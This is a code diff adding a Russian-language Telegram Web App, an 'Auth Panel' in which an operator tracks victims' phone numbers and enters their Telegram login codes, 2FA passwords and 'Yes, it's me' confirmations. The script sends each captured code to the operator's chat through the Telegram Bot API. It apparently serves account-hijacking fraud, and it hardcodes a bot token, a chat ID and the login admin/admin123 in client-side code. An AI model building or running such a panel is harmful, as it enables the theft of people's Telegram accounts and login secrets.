@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Auth Panel</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f5; }
+        
+        .container { padding: 20px; max-width: 500px; margin: 0 auto; }
+        
+        .header {
+            background: linear-gradient(135deg, #0088cc 0%, #0055cc 100%);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            border-radius: 0 0 25px 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 20px rgba(0,136,204,0.3);
+        }
+        
+        .header h1 { font-size: 24px; margin-bottom: 5px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        
+        .card {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            border: 1px solid #eaeaea;
+        }
+        
+        .step-card {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border-left: 4px solid #0088cc;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.05);
+        }
+        
+        h2 { color: #333; margin-bottom: 15px; font-size: 18px; }
+        h3 { color: #444; margin-bottom: 10px; font-size: 16px; }
+        
+        .btn {
+            background: linear-gradient(135deg, #0088cc 0%, #0055cc 100%);
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 15px rgba(0,136,204,0.3); }
+        .btn:active { transform: translateY(0); }
+        
+        .btn-success { background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%); }
+        .btn-danger { background: linear-gradient(135deg, #f44336 0%, #c62828 100%); }
+        .btn-warning { background: linear-gradient(135deg, #ff9800 0%, #ef6c00 100%); }
+        
+        .btn-sm { padding: 10px 15px; font-size: 14px; margin: 5px 0; }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #0088cc;
+            box-shadow: 0 0 0 3px rgba(0,136,204,0.1);
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 5px;
+            background: #e3f2fd;
+            color: #0055cc;
+        }
+        
+        .status-success { background: #e8f5e9; color: #2E7D32; }
+        .status-warning { background: #fff8e1; color: #ef6c00; }
+        .status-error { background: #ffebee; color: #c62828; }
+        
+        .code-display {
+            font-family: 'Courier New', monospace;
+            font-size: 28px;
+            letter-spacing: 8px;
+            background: #333;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        
+        .session-item {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 1px solid #e9ecef;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .session-item:hover {
+            background: white;
+            border-color: #0088cc;
+            transform: translateX(5px);
+        }
+        
+        .phone-number {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .session-id {
+            font-family: monospace;
+            background: #333;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            margin-right: 10px;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden { display: none; }
+        
+        .notes-box {
+            background: #fffde7;
+            border: 1px solid #ffecb3;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        
+        .admin-info {
+            background: #e3f2fd;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🔐 Telegram Auth Panel</h1>
+        <p>Управление авторизациями | Ваш токен: 8201555936</p>
+    </div>
+    
+    <div class="container">
+        <!-- Экран загрузки -->
+        <div id="loading" class="loading">
+            <div class="loading-spinner"></div>
+            <p>Загрузка приложения...</p>
+        </div>
+        
+        <!-- Экран входа -->
+        <div id="loginScreen" class="hidden">
+            <div class="card">
+                <h2>👨‍💼 Вход администратора</h2>
+                <div class="admin-info">
+                    <p><strong>Данные для входа:</strong></p>
+                    <p>Логин: <code>admin</code></p>
+                    <p>Пароль: <code>admin123</code></p>
+                </div>
+                
+                <input type="text" id="loginInput" placeholder="Введите логин" value="admin">
+                <input type="password" id="passwordInput" placeholder="Введите пароль" value="admin123">
+                <button class="btn" onclick="login()">🚪 Войти</button>
+            </div>
+        </div>
+        
+        <!-- Главная панель -->
+        <div id="mainPanel" class="hidden">
+            <!-- Создание новой сессии -->
+            <div class="card">
+                <h2>📱 Создать новую сессию</h2>
+                <input type="text" id="newPhone" placeholder="Номер телефона (79001112233)" maxlength="11">
+                <textarea id="newNotes" placeholder="Заметки (необязательно)" rows="3"></textarea>
+                <button class="btn" onclick="createNewSession()">➕ Создать сессию</button>
+            </div>
+            
+            <!-- Активные сессии -->
+            <div id="activeSessions">
+                <h2>📋 Активные сессии</h2>
+                <div id="sessionsList">
+                    <!-- Список сессий появится здесь -->
+                </div>
+            </div>
+        </div>
+        
+        <!-- Детали сессии -->
+        <div id="sessionDetail" class="hidden">
+            <!-- Контент будет заполняться динамически -->
+        </div>
+    </div>
+    
+    <script>
+        // ========== КОНФИГУРАЦИЯ ==========
+        const BOT_TOKEN = '8201555936:AAHIEz8LJ8tM_mgUzYkyLXSjoK2W_1quWj4';
+        const ADMIN_CHAT_ID = '5692738028'; // Ваш ID
+        const API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;
+        
+        // ========== ТЕЛЕГРАМ WEB APP ==========
+        const tg = window.Telegram.WebApp;
+        
+        // ========== ПЕРЕМЕННЫЕ ==========
+        let currentUser = null;
+        let sessions = {};
+        let currentSessionId = null;
+        
+        // ========== ИНИЦИАЛИЗАЦИЯ ==========
+        function initApp() {
+            tg.expand();
+            tg.BackButton.hide();
+            
+            // Проверяем авторизацию
+            const savedUser = localStorage.getItem('tg_auth_user');
+            if (savedUser) {
+                currentUser = JSON.parse(savedUser);
+                showMainPanel();
+                loadSessions();
+            } else {
+                showLoginScreen();
+            }
+            
+            hideLoading();
+            
+            // Настраиваем кнопку "Назад"
+            tg.BackButton.onClick(() => {
+                if (currentSessionId) {
+                    closeSessionDetail();
+                } else {
+                    tg.BackButton.hide();
+                }
+            });
+        }
+        
+        // ========== ЭКРАНЫ ==========
+        function showLoginScreen() {
+            hideAllScreens();
+            document.getElementById('loginScreen').classList.remove('hidden');
+        }
+        
+        function showMainPanel() {
+            hideAllScreens();
+            document.getElementById('mainPanel').classList.remove('hidden');
+        }
+        
+        function showSessionDetail() {
+            hideAllScreens();
+            document.getElementById('sessionDetail').classList.remove('hidden');
+            tg.BackButton.show();
+        }
+        
+        function hideAllScreens() {
+            document.getElementById('loginScreen').classList.add('hidden');
+            document.getElementById('mainPanel').classList.add('hidden');
+            document.getElementById('sessionDetail').classList.add('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading').classList.add('hidden');
+        }
+        
+        // ========== АВТОРИЗАЦИЯ ==========
+        function login() {
+            const username = document.getElementById('loginInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            
+            if (username === 'admin' && password === 'admin123') {
+                currentUser = { username: 'admin', role: 'admin' };
+                localStorage.setItem('tg_auth_user', JSON.stringify(currentUser));
+                
+                // Отправляем уведомление в Telegram
+                sendTelegramMessage(ADMIN_CHAT_ID, `🔐 Администратор ${username} вошел в панель`);
+                
+                showMainPanel();
+                loadSessions();
+            } else {
+                tg.showAlert('❌ Неверный логин или пароль');
+            }
+        }
+        
+        // ========== СЕССИИ ==========
+        function createNewSession() {
+            const phone = document.getElementById('newPhone').value.trim();
+            const notes = document.getElementById('newNotes').value.trim();
+            
+            if (!phone || phone.length !== 11 || !phone.startsWith('79')) {
+                tg.showAlert('❌ Введите номер в формате: 79001112233');
+                return;
+            }
+            
+            // Генерируем ID сессии
+            const sessionId = 'SESS' + Date.now().toString().slice(-8);
+            
+            // Создаем сессию
+            const session = {
+                id: sessionId,
+                phone: phone,
+                notes: notes,
+                step: 'phone_entered',
+                code: null,
+                password: null,
+                confirm: null,
+                created: new Date().toISOString(),
+                admin: currentUser.username,
+                status: 'active'
+            };
+            
+            // Сохраняем в localStorage
+            sessions[sessionId] = session;
+            saveSessionsToStorage();
+            
+            // Отправляем уведомление в Telegram
+            const message = `📱 *НОВАЯ СЕССИЯ*\n\n` +
+                          `ID: \`${sessionId}\`\n` +
+                          `📞: \`${phone}\`\n` +
+                          `👤 Админ: ${currentUser.username}\n` +
+                          `🕐 ${new Date().toLocaleTimeString()}`;
+            
+            sendTelegramMessage(ADMIN_CHAT_ID, message);
+            
+            // Очищаем форму
+            document.getElementById('newPhone').value = '';
+            document.getElementById('newNotes').value = '';
+            
+            tg.showAlert(`✅ Сессия создана! ID: ${sessionId}`);
+            
+            // Показываем детали сессии
+            openSessionDetail(sessionId);
+        }
+        
+        function loadSessions() {
+            // Загружаем из localStorage
+            const saved = localStorage.getItem('tg_auth_sessions');
+            if (saved) {
+                sessions = JSON.parse(saved);
+            }
+            
+            // Отображаем сессии
+            const container = document.getElementById('sessionsList');
+            container.innerHTML = '';
+            
+            const activeSessions = Object.values(sessions)
+                .filter(s => s.status !== 'completed')
+                .sort((a, b) => new Date(b.created) - new Date(a.created));
+            
+            if (activeSessions.length === 0) {
+                container.innerHTML = '<div class="card"><p>Нет активных сессий</p></div>';
+                return;
+            }
+            
+            activeSessions.forEach(session => {
+                const item = document.createElement('div');
+                item.className = 'session-item';
+                item.onclick = () => openSessionDetail(session.id);
+                
+                item.innerHTML = `
+                    <div class="phone-number">${session.phone}</div>
+                    <div>
+                        <span class="session-id">${session.id}</span>
+                        <span class="status-badge">${getStepName(session.step)}</span>
+                    </div>
+                    <div style="font-size: 12px; color: #666; margin-top: 5px;">
+                        ${new Date(session.created).toLocaleString()}
+                    </div>
+                `;
+                
+                container.appendChild(item);
+            });
+        }
+        
+        function openSessionDetail(sessionId) {
+            currentSessionId = sessionId;
+            const session = sessions[sessionId];
+            
+            const detailHtml = `
+                <div class="card">
+                    <h2>📱 Сессия ${session.id}</h2>
+                    <p><strong>Телефон:</strong> ${session.phone}</p>
+                    <p><strong>Создана:</strong> ${new Date(session.created).toLocaleString()}</p>
+                    <p><strong>Админ:</strong> ${session.admin}</p>
+                    
+                    ${session.notes ? `
+                    <div class="notes-box">
+                        <strong>📝 Заметки:</strong>
+                        <p>${session.notes}</p>
+                    </div>
+                    ` : ''}
+                </div>
+                
+                <!-- Шаг 1: Код из Telegram -->
+                <div class="step-card">
+                    <h3>🔢 Шаг 1: Код из Telegram</h3>
+                    ${session.code ? `
+                        <div class="code-display">${session.code}</div>
+                        <button class="btn btn-success" onclick="confirmStep('code')">✅ Подтвердить код</button>
+                        <button class="btn btn-danger" onclick="rejectStep('code')">❌ Неверный код</button>
+                    ` : `
+                        <input type="text" id="codeInput" placeholder="Введите 5-значный код" maxlength="5">
+                        <button class="btn" onclick="setCode()">📝 Установить код</button>
+                    `}
+                </div>
+                
+                <!-- Шаг 2: Пароль 2FA (показываем если код подтвержден) -->
+                ${session.step === 'code_confirmed' || session.password ? `
+                <div class="step-card">
+                    <h3>🔐 Шаг 2: Пароль 2FA</h3>
+                    ${session.password ? `
+                        <div style="padding: 15px; background: #f5f5f5; border-radius: 10px; margin: 10px 0;">
+                            Пароль установлен
+                        </div>
+                        <button class="btn btn-success" onclick="confirmStep('password')">✅ Подтвердить пароль</button>
+                        <button class="btn btn-danger" onclick="rejectStep('password')">❌ Неверный пароль</button>
+                    ` : `
+                        <input type="password" id="passwordInput" placeholder="Введите пароль 2FA">
+                        <button class="btn" onclick="setPassword()">📝 Установить пароль</button>
+                    `}
+                </div>
+                ` : ''}
+                
+                <!-- Шаг 3: "Да, это Я" -->
+                ${session.step === 'password_confirmed' || session.confirm ? `
+                <div class="step-card">
+                    <h3>✅ Шаг 3: "Да, это Я"</h3>
+                    ${session.confirm ? `
+                        <div style="padding: 15px; background: #e8f5e9; border-radius: 10px; margin: 10px 0;">
+                            ${session.confirm}
+                        </div>
+                        <button class="btn btn-success" onclick="confirmStep('final')">✅ Завершить авторизацию</button>
+                    ` : `
+                        <select id="confirmSelect">
+                            <option value="">Выберите статус</option>
+                            <option value="Пользователь нажал 'Да, это Я'">✅ Пользователь нажал "Да, это Я"</option>
+                            <option value="Ожидает подтверждения">⏳ Ожидает подтверждения</option>
+                        </select>
+                        <button class="btn" onclick="setConfirm()">📝 Установить статус</button>
+                    `}
+                </div>
+                ` : ''}
+                
+                <!-- Дополнительные действия -->
+                <div class="card">
+                    <h3>⚙️ Дополнительные действия</h3>
+                    <textarea id="sessionNotes" placeholder="Добавить заметку к сессии...">${session.notes || ''}</textarea>
+                    <button class="btn" onclick="updateSessionNotes()">💾 Сохранить заметки</button>
+                    <button class="btn btn-warning" onclick="resetSession()">🔄 Сбросить сессию</button>
+                </div>
+            `;
+            
+            document.getElementById('sessionDetail').innerHTML = detailHtml;
+            showSessionDetail();
+        }
+        
+        function closeSessionDetail() {
+            currentSessionId = null;
+            tg.BackButton.hide();
+            showMainPanel();
+            loadSessions();
+        }
+        
+        // ========== ДЕЙСТВИЯ С СЕССИЕЙ ==========
+        function setCode() {
+            const code = document.getElementById('codeInput').value.trim();
+            if (code.length !== 5 || !/^\d+$/.test(code)) {
+                tg.showAlert('❌ Код должен содержать 5 цифр');
+                return;
+            }
+            
+            sessions[currentSessionId].code = code;
+            sessions[currentSessionId].step = 'code_entered';
+            saveSessionsToStorage();
+            
+            // Отправляем уведомление
+            sendTelegramMessage(ADMIN_CHAT_ID, 
+                `🔢 *КОД ВВЕДЕН*\n\n` +
+                `Сессия: \`${currentSessionId}\`\n` +
+                `Код: \`${code}\`\n` +
+                `Телефон: ${sessions[currentSessionId].phone}`
+            );
+            
+            openSessionDetail(currentSessionId);
+        }
+        
+        function setPassword() {
+            const password = document.getElementById('passwordInput').value.trim();
+            if (!password) {
+                tg.showAlert('❌ Введите пароль');
+                return;
+            }
+            
+            sessions[currentSessionId].password = password;
+            sessions[currentSessionId].step = 'password_entered';
+            saveSessionsToStorage();
+            
+            sendTelegramMessage(ADMIN_CHAT_ID,
+                `🔐 *ПАРОЛЬ 2FA ВВЕДЕН*\n\n` +
+                `Сессия: \`${currentSessionId}\`\n` +
+                `Телефон: ${sessions[currentSessionId].phone}`
+            );
+            
+            openSessionDetail(currentSessionId);
+        }
+        
+        function setConfirm() {
+            const confirmStatus = document.getElementById('confirmSelect').value;
+            if (!confirmStatus) {
+                tg.showAlert('❌ Выберите статус');
+                return;
+            }
+            
+            sessions[currentSessionId].confirm = confirmStatus;
+            sessions[currentSessionId].step = 'confirm_entered';
+            saveSessionsToStorage();
+            
+            openSessionDetail(currentSessionId);
+        }
+        
+        function confirmStep(step) {
+            const session = sessions[currentSessionId];
+            
+            if (step === 'code') {
+                session.step = 'code_confirmed';
+            } else if (step === 'password') {
+                session.step = 'password_confirmed';
+            } else if (step === 'final') {
+                session.step = 'completed';
+                session.status = 'completed';
+                session.completed_at = new Date().toISOString();
+                
+                // Отправляем финальное уведомление
+                sendTelegramMessage(ADMIN_CHAT_ID,
+                    `🎉 *АВТОРИЗАЦИЯ ЗАВЕРШЕНА!*\n\n` +
+                    `Сессия: \`${currentSessionId}\`\n` +
+                    `Телефон: ${session.phone}\n` +
+                    `✅ Успешная авторизация!`
+                );
+            }
+            
+            saveSessionsToStorage();
+            openSessionDetail(currentSessionId);
+        }
+        
+        function rejectStep(step) {
+            const session = sessions[currentSessionId];
+            
+            if (step === 'code') {
+                session.code = null;
+                session.step = 'phone_entered';
+            } else if (step === 'password') {
+                session.password = null;
+                session.step = 'code_confirmed';
+            }
+            
+            saveSessionsToStorage();
+            openSessionDetail(currentSessionId);
+        }
+        
+        function updateSessionNotes() {
+            const notes = document.getElementById('sessionNotes').value.trim();
+            sessions[currentSessionId].notes = notes;
+            saveSessionsToStorage();
+            tg.showAlert('✅ Заметки сохранены');
+        }
+        
+        function resetSession() {
+            if (tg.showConfirm('Сбросить сессию? Все данные будут удалены.')) {
+                sessions[currentSessionId] = {
+                    ...sessions[currentSessionId],
+                    code: null,
+                    password: null,
+                    confirm: null,
+                    step: 'phone_entered'
+                };
+                saveSessionsToStorage();
+                openSessionDetail(currentSessionId);
+            }
+        }
+        
+        // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
+        function saveSessionsToStorage() {
+            localStorage.setItem('tg_auth_sessions', JSON.stringify(sessions));
+        }
+        
+        function getStepName(step) {
+            const steps = {
+                'phone_entered': '📱 Ожидает код',
+                'code_entered': '🔢 Код введен',
+                'code_confirmed': '✅ Код подтвержден',
+                'password_entered': '🔐 Пароль введен',
+                'password_confirmed': '✅ Пароль подтвержден',
+                'confirm_entered': '✅ Ожидает подтверждения',
+                'completed': '🎉 Завершено'
+            };
+            return steps[step] || step;
+        }
+        
+        async function sendTelegramMessage(chatId, text) {
+            try {
+                const response = await fetch(API_URL + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                return await response.json();
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+            }
+        }
+        
+        // ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
+        document.addEventListener('DOMContentLoaded', initApp);
+        
+        // Сохраняем данные при закрытии
+        window.addEventListener('beforeunload', () => {
+            if (currentSessionId) {
+                saveSessionsToStorage();
+            }
+        });
+    </script>
+</body>
+</html>
